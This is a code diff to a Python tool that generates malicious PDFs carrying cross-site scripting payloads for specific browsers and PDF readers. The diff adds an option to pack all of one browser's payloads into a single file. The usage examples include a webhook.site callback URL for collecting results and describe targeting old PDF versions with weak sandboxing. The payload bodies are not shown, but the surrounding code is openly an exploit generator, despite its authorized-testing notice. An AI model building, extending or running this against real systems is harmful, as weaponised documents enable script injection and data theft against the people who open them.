@@ -1859,6 +1859,8 @@ EXAMPLES:
   python3 script.py -b all -u https://webhook.site/xyz          # 1000+ all exploits
   python3 script.py --pdf-version 1.3 -b firefox               # PDF-1.3 weak sandbox
   python3 script.py --pdf-version 1.0 -b all                   # PDF-1.0 minimal security
+  python3 script.py -b chrome --browser-specific-file           # Single file with all Chrome payloads
+  python3 script.py -b firefox --browser-specific-file -u http://test.com  # Single file with all Firefox payloads
   python3 script.py --list-pdf-versions                         # Show PDF capabilities
   python3 script.py --list-research                             # Show CVE references
   python3 script.py -v --output-json                            # Verbose with JSON output
@@ -1892,8 +1894,16 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
                         help='PDF standard version (older versions have fewer security measures)')
     parser.add_argument('--list-pdf-versions', action='store_true',
                         help='List available PDF versions and their capabilities')
+    parser.add_argument('--browser-specific-file', action='store_true',
+                        help='Create a single file with all payloads for the specified browser (requires -b browser, not "all")')
     
     args = parser.parse_args()
+    
+    # Validate browser-specific-file flag
+    if args.browser_specific_file and args.browser == 'all':
+        print("❌ Error: --browser-specific-file requires a specific browser (-b chrome/firefox/safari/adobe/edge), not 'all'")
+        print("   Example: python3 script.py -b chrome --browser-specific-file")
+        return
     
     if args.list_research:
         print("RESEARCH SOURCES AND CVE REFERENCES:")
@@ -2001,46 +2011,84 @@ LEGAL NOTICE: For authorized security testing only. Users responsible for compli
         os.makedirs(files_dir)
         print(f"📁 Created directory: {files_dir}")
     
-    # Group payloads by browser
-    payloads_by_browser = {}
-    for payload in all_payloads:
-        browser = payload['browser']
-        if browser not in payloads_by_browser:
-            payloads_by_browser[browser] = []
-        payloads_by_browser[browser].append(payload)
-    
-    print(f"\n📁 Creating {len(payloads_by_browser)} PDF files (one per browser) in {files_dir}/ directory...")
-    
-    for browser, browser_payloads in payloads_by_browser.items():
-        # Shorter, more descriptive filename per browser
+    # Handle browser-specific-file flag
+    if args.browser_specific_file:
+        # Create a single file with ALL payloads for the specified browser
         pdf_version_str = f"_v{args.pdf_version}" if args.pdf_version else ""
-        base_filename = f"{browser}_xss_payloads{pdf_version_str}.pdf"
+        base_filename = f"{args.browser}_all_payloads{pdf_version_str}.pdf"
         filename = os.path.join(files_dir, base_filename)
         
+        print(f"\n📁 Creating single browser-specific file with ALL {args.browser} payloads...")
+        print(f"   File: {base_filename}")
+        print(f"   Total payloads: {len(all_payloads)}")
+        
         try:
-            create_multi_payload_pdf(filename, browser_payloads, args.pdf_version)
+            create_multi_payload_pdf(filename, all_payloads, args.pdf_version)
             generated_files.append(filename)
             
             if args.verbose:
                 print(f"✅ {filename}")
-                print(f"   Browser: {browser}")
-                print(f"   Payloads: {len(browser_payloads)}")
-                for payload in browser_payloads[:3]:  # Show first 3 payloads
-                    print(f"     - {payload['technique']}: {payload['description'][:50]}...")
-                if len(browser_payloads) > 3:
-                    print(f"     ... and {len(browser_payloads) - 3} more payloads")
+                print(f"   Browser: {args.browser}")
+                print(f"   Total Payloads: {len(all_payloads)}")
+                for i, payload in enumerate(all_payloads[:5]):  # Show first 5 payloads
+                    print(f"     {i+1}. {payload['technique']}: {payload['description'][:60]}...")
+                if len(all_payloads) > 5:
+                    print(f"     ... and {len(all_payloads) - 5} more payloads")
                 print()
             else:
-                print(f"✅ {browser}: {len(browser_payloads)} payloads → {base_filename}")
+                print(f"✅ Created: {base_filename} with {len(all_payloads)} payloads")
                 
         except Exception as e:
             print(f"❌ Error creating {filename}: {e}")
+            
+    else:
+        # Original behavior: Group payloads by browser (one file per browser)
+        # Group payloads by browser
+        payloads_by_browser = {}
+        for payload in all_payloads:
+            browser = payload['browser']
+            if browser not in payloads_by_browser:
+                payloads_by_browser[browser] = []
+            payloads_by_browser[browser].append(payload)
+        
+        print(f"\n📁 Creating {len(payloads_by_browser)} PDF files (one per browser) in {files_dir}/ directory...")
+        
+        for browser, browser_payloads in payloads_by_browser.items():
+            # Shorter, more descriptive filename per browser
+            pdf_version_str = f"_v{args.pdf_version}" if args.pdf_version else ""
+            base_filename = f"{browser}_xss_payloads{pdf_version_str}.pdf"
+            filename = os.path.join(files_dir, base_filename)
+            
+            try:
+                create_multi_payload_pdf(filename, browser_payloads, args.pdf_version)
+                generated_files.append(filename)
+                
+                if args.verbose:
+                    print(f"✅ {filename}")
+                    print(f"   Browser: {browser}")
+                    print(f"   Payloads: {len(browser_payloads)}")
+                    for payload in browser_payloads[:3]:  # Show first 3 payloads
+                        print(f"     - {payload['technique']}: {payload['description'][:50]}...")
+                    if len(browser_payloads) > 3:
+                        print(f"     ... and {len(browser_payloads) - 3} more payloads")
+                    print()
+                else:
+                    print(f"✅ {browser}: {len(browser_payloads)} payloads → {base_filename}")
+                    
+            except Exception as e:
+                print(f"❌ Error creating {filename}: {e}")
     
     # Output comprehensive summary
     print(f"\n🎯 GENERATION COMPLETE")
     print("=" * 30)
-    print(f"✅ Successfully generated {len(generated_files)} PDF files (one per browser)")
-    print(f"📊 Total payload variations: {len(all_payloads)} across {len(payloads_by_browser)} browsers")
+    if args.browser_specific_file:
+        print(f"✅ Successfully generated browser-specific file with all {args.browser} payloads")
+        print(f"📊 Total payload variations: {len(all_payloads)} in 1 file")
+    else:
+        # Count browsers for multi-file generation
+        unique_browsers = set(payload['browser'] for payload in all_payloads)
+        print(f"✅ Successfully generated {len(generated_files)} PDF files (one per browser)")
+        print(f"📊 Total payload variations: {len(all_payloads)} across {len(unique_browsers)} browsers")
     
     # Detailed breakdown
     categories = {}
